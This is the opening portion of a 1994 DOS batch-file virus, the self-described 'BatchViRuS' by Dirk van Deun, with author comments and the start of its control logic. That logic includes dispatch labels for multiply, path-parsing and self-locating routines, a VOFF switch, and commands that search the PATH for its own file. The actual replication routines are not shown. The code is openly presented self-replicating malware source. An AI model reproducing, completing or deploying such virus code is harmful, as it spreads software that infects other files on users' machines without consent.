   @echo off>nul.ViRuS
   rem ViRuS The BatchViRuS by Dirk van Deun 1994
   rem ViRuS May be copied freely (On your own machine !)
   rem ViRuS Programmed to prove that it's possible
   rem ViRuS (and to show off skill in writing batchfiles)
   rem ViRuS If you have no disk cache, you're not interested ;-)
   rem ViRuS E-mail hw41652@vub.ac.be

   rem ViRuS Known bug: interpretation of variables may make lines too long
   rem ViRuS for DOS and let characters drop off: unpredictable behaviour

   if "%0==" echo --------------------------------------->con.ViRuS
   if "%0==" echo |   Hi ! I am the nice BatchViRuS !   |
   if "%0==" echo --------------------------------------->con.ViRuS
   if "%0==" goto ViRuS_OLDBAT
   if "%1=="/ViRuS_MULTIPLY goto ViRuS_multiply
   if "%1=="/ViRuS_PARSEPATH goto ViRuS_parsepath
   if "%1=="/ViRuS_FINDSELF goto ViRuS_findself
   if "%VOFF%=="T goto ViRuS_OLDBAT

   set ViRuSname=%0
   if not exist %0.bat command /e:10000 /c %0 /ViRuS_FINDSELF %path%
   if not exist %0.bat call xV
